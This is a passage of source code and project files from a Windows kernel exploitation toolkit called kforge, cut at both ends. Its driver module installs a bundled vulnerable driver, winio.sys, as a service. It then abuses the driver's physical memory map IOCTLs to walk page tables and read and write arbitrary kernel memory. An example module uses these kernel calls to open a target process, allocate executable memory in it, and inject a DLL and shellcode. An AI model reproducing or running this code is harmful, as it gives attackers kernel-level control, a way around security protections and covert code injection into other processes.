      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <AdditionalIncludeDirectories>$(SolutionDir);$(ProjectDir)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <AdditionalDependencies>..\kforge_driver.lib;..\kforge_library.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <ProgramDatabaseFile>$(SolutionDir)$(TargetName).pdb</ProgramDatabaseFile>
      <OutputFile>$(SolutionDir)$(TargetName)$(TargetExt)</OutputFile>
      <AdditionalOptions>/DEF:kforge.def %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="targetver.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="kforge.cpp">
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">false</CompileAsManaged>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
      </PrecompiledHeader>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Release|x64'">false</CompileAsManaged>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
      </PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`kforge/kforge.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="kforge.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`kforge/stdafx.h`:

```h
#pragma once

#include "targetver.h"

#include <windows.h>

#include "include/kforge_library.h"

```

`kforge/targetver.h`:

```h
#pragma once

// Including SDKDDKVer.h defines the highest available Windows platform.

// If you wish to build your application for a previous Windows platform, include WinSDKVer.h and
// set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h.

#include <SDKDDKVer.h>

```

`kforge_driver/kforge_driver.cpp`:

```cpp
#include "stdafx.h"

// winio.sys driver binary
#include "winio_sys.h"

/*
    PROCESSOR_START_BLOCK is allocated by winload.efi, so it could be
    anywhere in the low memory.
*/
#define PROCESSOR_START_BLOCK_MIN 0
#define PROCESSOR_START_BLOCK_MAX 0x10000

#pragma pack(push, 2)

typedef struct _FAR_JMP_16
{
    BYTE OpCode; // = 0xe9
    WORD Offset;

} FAR_JMP_16;

typedef struct _PSEUDO_DESCRIPTOR_32
{
    WORD Limit;
    DWORD Base;

} PSEUDO_DESCRIPTOR_32;

#pragma pack(pop)

typedef struct _PROCESSOR_START_BLOCK *PPROCESSOR_START_BLOCK;
typedef struct _PROCESSOR_START_BLOCK
{
    // The block starts with a jmp instruction to the end of the block
    FAR_JMP_16 Jmp;

    // Completion flag is set to non-zero when the target processor has
    // started
    DWORD CompletionFlag;

    // Pseudo descriptors for GDT and IDT
    PSEUDO_DESCRIPTOR_32 Gdt32;
    PSEUDO_DESCRIPTOR_32 Idt32;

    // ...

} PROCESSOR_START_BLOCK,
*PPROCESSOR_START_BLOCK;

// other fields offsets
#define PROCESSOR_START_BLOCK_HalpLMStub    0x70
#define PROCESSOR_START_BLOCK_Cr3           0xa0

// PML4 base of the kernel virtual address space
static DWORD_PTR m_PML4_Addr = 0;

// loldriver device handle
static HANDLE m_hDevice = NULL;
//--------------------------------------------------------------------------------------
static BOOL DriverInitPageTableBase(PDWORD_PTR pPML4_Addr)
{
    BOOL bRet = FALSE;

    // allocate memory to read PROCESSOR_START_BLOCK
    PUCHAR Data = (PUCHAR)M_ALLOC(PAGE_SIZE);
    if (Data == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
        return FALSE;
    }

    // find an exact location of the PROCESSOR_START_BLOCK
    for (DWORD_PTR Addr = PROCESSOR_START_BLOCK_MIN; 
                   Addr < PROCESSOR_START_BLOCK_MAX; Addr += PAGE_SIZE)
    {
        if (WinioPhysRead(m_hDevice, Addr, PAGE_SIZE, Data))
        {
            PPROCESSOR_START_BLOCK Info = (PPROCESSOR_START_BLOCK)Data;

            // get page table address and HalpLMStub address
            DWORD_PTR PML4_Addr = *(DWORD_PTR *)(Data + PROCESSOR_START_BLOCK_Cr3);
            DWORD_PTR HalpLMStub = *(DWORD_PTR *)(Data + PROCESSOR_START_BLOCK_HalpLMStub);            

            // check for the sane values
            if (Info->Jmp.OpCode != 0xe9 || Info->CompletionFlag != 1 || HalpLMStub == 0 || PML4_Addr == 0)
            {
                // looks bad
                continue;
            }

            DbgMsg(__FILE__, __LINE__, "PROCESSOR_START_BLOCK is at "IFMT"\n", Addr);
            DbgMsg(__FILE__, __LINE__, "Kernel mode PML4 address is "IFMT"\n", PML4_Addr);

            if (pPML4_Addr)
            {
                *pPML4_Addr = PML4_Addr;
            }            
            
            bRet = TRUE;
            break;
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: WinioPhysMemRead() fails\n");
            break;
        }
    }

    M_FREE(Data);

    return bRet;
}
//--------------------------------------------------------------------------------------
static BOOL DriverVirtToPhys(DWORD_PTR PML4_Addr, PVOID AddrVirt, PDWORD_PTR pAddrPhys)
{    
    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    

    DWORD_PTR AddrPhys = PML4_ADDRESS(PML4_Addr) + PML4_INDEX(AddrVirt) * sizeof(DWORD64);

    if (m_hDevice == NULL)
    {
        // not initialized
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
        return FALSE;
    }

    // read PML4 entry
    if (!WinioPhysRead(m_hDevice, AddrPhys, sizeof(PML4_entry), &PML4_entry.Uint64))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: WinioPhysMemRead() fails\n");
        return FALSE;
    }

    // check if PML4 entry is present
    if (PML4_entry.Bits.Present == 0)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: PML4E for "IFMT" is not present\n", AddrVirt);
        return FALSE;
    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;

    AddrPhys = PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(AddrVirt) * sizeof(DWORD64);

    // read PDPT entry
    if (!WinioPhysRead(m_hDevice, AddrPhys, sizeof(PDPT_entry), &PDPT_entry.Uint64))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: WinioPhysMemRead() fails\n");
        return FALSE;
    }

    // check if PDPT entry is present
    if (PDPT_entry.Bits.Present == 0)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: PDPTE for "IFMT" is not present\n", AddrVirt);
        return FALSE;
    }

    // check for page size flag
    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
    {
        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;

        AddrPhys = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(AddrVirt) * sizeof(DWORD64);

        // read PD entry
        if (!WinioPhysRead(m_hDevice, AddrPhys, sizeof(PD_entry), &PD_entry.Uint64))
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: WinioPhysMemRead() fails\n");
            return FALSE;
        }

        // check if PD entry is present
        if (PD_entry.Bits.Present == 0)
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: PDE for "IFMT" is not present\n", AddrVirt);
            return FALSE;
        }

        // check for page size flag
        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
        {
            X64_PAGE_TABLE_ENTRY_4K PT_entry;

            AddrPhys = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(AddrVirt) * sizeof(DWORD64);

            // read PT entry
            if (!WinioPhysRead(m_hDevice, AddrPhys, sizeof(PD_entry), &PT_entry.Uint64))
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: WinioPhysMemRead() fails\n");
                return FALSE;
            }

            // check if PT entry is present
            if (PT_entry.Bits.Present)
            {
                // calculate 4Kb page address
                *pAddrPhys = PFN_TO_PAGE(PT_entry.Bits.PageTableBaseAddress) + PAGE_OFFSET_4K(AddrVirt);
                return TRUE;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: PTE for "IFMT" is not present\n", AddrVirt);
            }
        }
        else
        {
            // calculate 2Mb page address
            *pAddrPhys = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PAGE_OFFSET_2M(AddrVirt);
            return TRUE;
        }                  
    }
    else
    {
        // calculate 1Gb page address
        *pAddrPhys = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PAGE_OFFSET_1G(AddrVirt);
        return TRUE;
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOL DriverInit(void)
{
    BOOL bStarted = FALSE;
    char szFilePath[MAX_PATH];

    if (m_hDevice != NULL)
    {
        // already initialized
        return TRUE;
    }

    if (!LoadPrivileges(SE_LOAD_DRIVER_NAME))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: LoadPrivileges() fails\n");
        return FALSE;
    }

    // make driver file path
    GetSystemDirectory(szFilePath, MAX_PATH);
    strcat_s(szFilePath, "\\drivers\\" WINIO_DRIVER_NAME);

    // first try to start already existing service
    if (!(bStarted = ServiceStart(WINIO_SERVICE_NAME, szFilePath, FALSE)))
    {
        // copy driver into the drivers directory
        if (DumpToFile(szFilePath, winio_sys, sizeof(winio_sys)))
        {
            // try to create new service
            if (!(bStarted = ServiceStart(WINIO_SERVICE_NAME, szFilePath, TRUE)))
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: ServiceStart() fails\n");

                // remove driver
                DeleteFile(szFilePath);
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DumpToFile() fails\n");
        }
    }

    if (bStarted)
    {
        // get handle of the target device
        if ((m_hDevice = CreateFile(
            WINIO_DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0,
            NULL, OPEN_EXISTING, 0, NULL)) != INVALID_HANDLE_VALUE)
        {
            DbgMsg(__FILE__, __LINE__, "%s kernel driver was successfully loaded\n", WINIO_DRIVER_NAME);

            // initialize PML4 address
            if (DriverInitPageTableBase(&m_PML4_Addr))
            {
                return TRUE;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverInitPageTableBase() fails\n");
            }

            CloseHandle(m_hDevice);
            m_hDevice = NULL;
        }

        // remove service
        ServiceStop(WINIO_SERVICE_NAME);
        ServiceRemove(WINIO_SERVICE_NAME);

        // remove driver
        DeleteFile(szFilePath);
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOL DriverUninit(void)
{
    char szFilePath[MAX_PATH];

    if (m_hDevice == NULL)
    {
        // not initialized
        return TRUE;
    }

    CloseHandle(m_hDevice);
    m_hDevice = NULL;

    // make driver file path
    GetSystemDirectory(szFilePath, MAX_PATH);
    strcat_s(szFilePath, "\\drivers\\" WINIO_DRIVER_NAME);

    // remove service
    ServiceStop(WINIO_SERVICE_NAME);
    ServiceRemove(WINIO_SERVICE_NAME);

    // remove driver
    DeleteFile(szFilePath);

    return TRUE;
}
//--------------------------------------------------------------------------------------
BOOL DriverMemWrite(PVOID Addr, PVOID Data, DWORD_PTR DataSize)
{
    DWORD_PTR AddrPhys = 0;

    if (m_hDevice == NULL)
    {
        // not initialized
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
        return FALSE;
    }

    // translate virtual address to physical
    if (DriverVirtToPhys(m_PML4_Addr, Addr, &AddrPhys))
    {
        // write to the physical memory location
        if (WinioPhysWrite(m_hDevice, AddrPhys, DataSize, Data))
        {
            return TRUE;
        }
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOL DriverMemRead(PVOID Addr, PVOID Data, DWORD_PTR DataSize)
{
    DWORD_PTR AddrPhys = 0;

    if (m_hDevice == NULL)
    {
        // not initialized
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
        return FALSE;
    }

    // translate virtual address to physical
    if (DriverVirtToPhys(m_PML4_Addr, Addr, &AddrPhys))
    {
        // read from the physical memory location
        if (WinioPhysRead(m_hDevice, AddrPhys, DataSize, Data))
        {
            return TRUE;
        }
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
// EoF

```

`kforge_driver/kforge_driver.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="..\common\service.cpp" />
    <ClCompile Include="kforge_driver.cpp" />
    <ClCompile Include="winio.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\common\common.h" />
    <ClInclude Include="..\common\debug.h" />
    <ClInclude Include="..\common\ntdll_defs.h" />
    <ClInclude Include="..\common\ntdll_undocnt.h" />
    <ClInclude Include="..\common\service.h" />
    <ClInclude Include="..\common\virtmem.h" />
    <ClInclude Include="..\include\kforge_driver.h" />
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="winio.h" />
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{9244F175-9960-47FB-A197-F717D5C2C370}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>kforge_driver</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v120</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v120</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>WIN32;_DEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
      <AdditionalIncludeDirectories>$(SolutionDir);$(ProjectDir)</AdditionalIncludeDirectories>
      <AdditionalOptions>/D DBG %(AdditionalOptions)</AdditionalOptions>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
    <Lib>
      <OutputFile>$(SolutionDir)$(TargetName)$(TargetExt)</OutputFile>
    </Lib>
    <PreBuildEvent>
      <Command>pre_build.bat</Command>
    </PreBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>WIN32;NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <AdditionalIncludeDirectories>$(SolutionDir);$(ProjectDir)</AdditionalIncludeDirectories>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <AdditionalOptions>/D DBG %(AdditionalOptions)</AdditionalOptions>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
    <Lib>
      <OutputFile>$(SolutionDir)$(TargetName)$(TargetExt)</OutputFile>
    </Lib>
    <PreBuildEvent>
      <Command>pre_build.bat</Command>
    </PreBuildEvent>
  </ItemDefinitionGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`kforge_driver/kforge_driver.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Header Files\common">
      <UniqueIdentifier>{d4d8c19d-1de9-45ef-8245-96b4b2e4d1a7}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\common">
      <UniqueIdentifier>{ab0716b7-ca2c-43f5-ae9f-7027030574be}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="kforge_driver.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="winio.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="..\common\service.cpp">
      <Filter>Source Files\common</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\common\common.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\common\debug.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\common\ntdll_defs.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\common\ntdll_undocnt.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\common\virtmem.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\include\kforge_driver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="winio.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\common\service.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`kforge_driver/pre_build.bat`:

```bat
@echo off
python ..\tools\make_header.py --input ..\winio.sys --output winio_sys.h --name winio_sys
pause

```

`kforge_driver/stdafx.h`:

```h
#pragma warning(disable: 4996)

#include <Windows.h>
#include <sddl.h>

#include "common/ntdll_defs.h"
#include "common/ntdll_undocnt.h"
#include "common/common.h"
#include "common/debug.h"
#include "common/virtmem.h"
#include "common/service.h"

#include "include/kforge_driver.h"

#include "winio.h"

```

`kforge_driver/winio.cpp`:

```cpp
#include "stdafx.h"
//--------------------------------------------------------------------------------------
static BOOL WinioPhysMap(
    HANDLE hDevice, DWORD_PTR Addr, DWORD_PTR Size,
    HANDLE *phSection, PVOID *pSectionAddr, PVOID *pObjectAddr)
{
    DWORD dwSize = 0;
    WINIO_PHYS_MEM Request;    

    ZeroMemory(&Request, sizeof(Request));

    Request.Size = Size;
    Request.Addr = Addr;

    // send physical memory map request
    if (DeviceIoControl(
        hDevice, IOCTL_WINIO_PHYS_MEM_MAP,
        &Request, sizeof(Request), &Request, sizeof(Request), &dwSize, NULL))
    {
        *phSection = Request.hSection;
        *pObjectAddr = Request.ObjectAddr;
        *pSectionAddr = Request.SectionAddr;               

        return TRUE;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "DeviceIoControl() ERROR %d\n", GetLastError());
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
static BOOL WinioPhysUnmap(HANDLE hDevice, HANDLE hSection, PVOID SectionAddr, PVOID ObjectAddr)
{
    DWORD dwSize = 0;
    WINIO_PHYS_MEM Request;

    ZeroMemory(&Request, sizeof(Request));

    Request.hSection = hSection;
    Request.SectionAddr = SectionAddr;
    Request.ObjectAddr = ObjectAddr;

    // send physical memory unmap request
    if (DeviceIoControl(
        hDevice, IOCTL_WINIO_PHYS_MEM_UNMAP,
        &Request, sizeof(Request), &Request, sizeof(Request), &dwSize, NULL))
    {
        return TRUE;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "DeviceIoControl() ERROR %d\n", GetLastError());
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOL WinioPhysRead(HANDLE hDevice, DWORD_PTR Addr, DWORD_PTR Size, PVOID Data)
{
    BOOL bRet = FALSE;
    HANDLE hSection = NULL;
    PVOID SectionAddr = NULL, ObjectAddr = NULL;

    // map physical memory region
    if (!WinioPhysMap(hDevice, Addr, Size, &hSection, &SectionAddr, &ObjectAddr))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: WinioPhysMemMap() fails\n");
        return FALSE;
    }

    __try
    {
        // perform memory read operation
        bRet = memcpy(Data, SectionAddr, Size) != NULL;
    }
    __finally
    {
        // unmap physical memory region
        WinioPhysUnmap(hDevice, hSection, SectionAddr, ObjectAddr);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL WinioPhysWrite(HANDLE hDevice, DWORD_PTR Addr, DWORD_PTR Size, PVOID Data)
{
    BOOL bRet = FALSE;
    HANDLE hSection = NULL;
    PVOID SectionAddr = NULL, ObjectAddr = NULL;

    // map physical memory region
    if (!WinioPhysMap(hDevice, Addr, Size, &hSection, &SectionAddr, &ObjectAddr) != 0)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: WinioPhysMemMap() fails\n");
        return FALSE;
    }

    __try
    {
        // perform memory write operation
        bRet = memcpy(SectionAddr, Data, Size) != NULL;
    }
    __finally
    {
        // unmap physical memory region
        WinioPhysUnmap(hDevice, hSection, SectionAddr, ObjectAddr);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
// EoF

```

`kforge_driver/winio.h`:

```h

// vulnerable driver device name
#define WINIO_DEVICE_PATH "\\\\.\\Global\\EneIo"

// vulnerable driver service and file name
#define WINIO_DRIVER_NAME  "winio.sys"
#define WINIO_SERVICE_NAME "winio"

#define FILE_DEVICE_WINIO 0x00008010

// map physical memory region
#define IOCTL_WINIO_PHYS_MEM_MAP CTL_CODE(FILE_DEVICE_WINIO, 0x00000810, METHOD_BUFFERED, FILE_ANY_ACCESS)

// unmap physical memory region
#define IOCTL_WINIO_PHYS_MEM_UNMAP CTL_CODE(FILE_DEVICE_WINIO, 0x00000811, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _WINIO_PHYS_MEM
{
    DWORD_PTR Size;
    DWORD_PTR Addr;
    HANDLE hSection;
    PVOID SectionAddr;
    PVOID ObjectAddr;

} WINIO_PHYS_MEM,
*PWINIO_PHYS_MEM;


BOOL WinioPhysRead(HANDLE hDevice, DWORD_PTR Addr, DWORD_PTR Size, PVOID Data);
BOOL WinioPhysWrite(HANDLE hDevice, DWORD_PTR Addr, DWORD_PTR Size, PVOID Data);

```

`kforge_example/func_order.txt`:

```txt
dll_inject_Entry
dll_inject_CalcHash
dll_inject_GetModuleAddressByHash
dll_inject_GetProcAddressByHash
dll_inject_ProcessImports
dll_inject_End

```

`kforge_example/kforge_example.cpp`:

```cpp
#include "stdafx.h"
//--------------------------------------------------------------------------------------
BOOL DllInject(HANDLE ProcessId, PVOID Data, DWORD dwDataSize)
{
    BOOL bRet = FALSE;

    PVOID Image = NULL;
    DWORD dwImageSize = 0;
    
    DWORD_PTR Status = STATUS_UNSUCCESSFUL;
    HANDLE hProcess = NULL, hThread = NULL;
    PVOID ImageAddr = NULL, ShellcodeAddr = NULL;
    SIZE_T ImageSize = 0, InjectStructSize = 0;

    // map image sections to the memory
    if (!LdrMapImage(Data, dwDataSize, &Image, &dwImageSize))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: LdrMapImage() fails\n");
        return FALSE;
    }

    // calculate shellcode and DLL_INJECT_STRUCT size
    DWORD dwShellcodeSize = (DWORD)((DWORD_PTR)&dll_inject_End - (DWORD_PTR)&dll_inject_Entry);
    DWORD dwInjectStructSize = sizeof(DLL_INJECT_STRUCT) + dwShellcodeSize;

    DbgMsg(__FILE__, __LINE__, "DLL inject shellcode size is %d bytes\n", dwInjectStructSize);

    PDLL_INJECT_STRUCT InjectStruct = (PDLL_INJECT_STRUCT)M_ALLOC(dwInjectStructSize);
    if (InjectStruct == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n\n", GetLastError());
        goto _end;
    }

    CopyMemory(InjectStruct->Shellcode, &dll_inject_Entry, dwShellcodeSize);

    CLIENT_ID ClientId;
    OBJECT_ATTRIBUTES ObjAttr;
    
    ImageSize = dwImageSize;
    InjectStructSize = dwInjectStructSize;

    InitializeObjectAttributes(&ObjAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    ClientId.UniqueProcess = ProcessId;
    ClientId.UniqueThread = NULL;

    PVOID Args_1[] = { KF_ARG(&hProcess),                   // ProcessHandle
                       KF_ARG(PROCESS_ALL_ACCESS),          // DesiredAccess
                       KF_ARG(&ObjAttr),                    // ObjectAttributes
                       KF_ARG(&ClientId) };                 // ClientId

    // open the target process
    if (!KfCall("ZwOpenProcess", Args_1, 4, KF_RET(&Status)))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: KfCall() fails\n");
        goto _end;
    }

    if (NT_ERROR(Status))
    {
        DbgMsg(__FILE__, __LINE__, "ZwOpenProcess() ERROR 0x%.8x\n", Status);
        goto _end;
    }

    PVOID Args_2[] = { KF_ARG(hProcess),                    // ProcessHandle    
                       KF_ARG(&ImageAddr),                  // BaseAddress
                       KF_ARG(0),                           // ZeroBits
                       KF_ARG(&ImageSize),                  // RegionSize
                       KF_ARG(MEM_COMMIT | MEM_RESERVE),    // AllocationType
                       KF_ARG(PAGE_EXECUTE_READWRITE) };    // Protect

    // allocate memory for the DLL image
    if (!KfCall("ZwAllocateVirtualMemory", Args_2, 6, KF_RET(&Status)))
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: KfCall() fails\n");
        goto _end;
    }

    if (NT_ERROR(Status))
    {
        DbgMsg(__FILE__, __LINE__, "ZwAllocateVirtualMemory() ERROR 0x%.8x\n", Status);
        goto _end;
    }

    DbgMsg(__FILE__, __LINE__, "DLL image memory was allocated at "IFMT"\n", ImageAddr);

    // relocate DLL image file to the new base address
    if (!LdrProcessRelocs(Image, ImageAddr))
    {
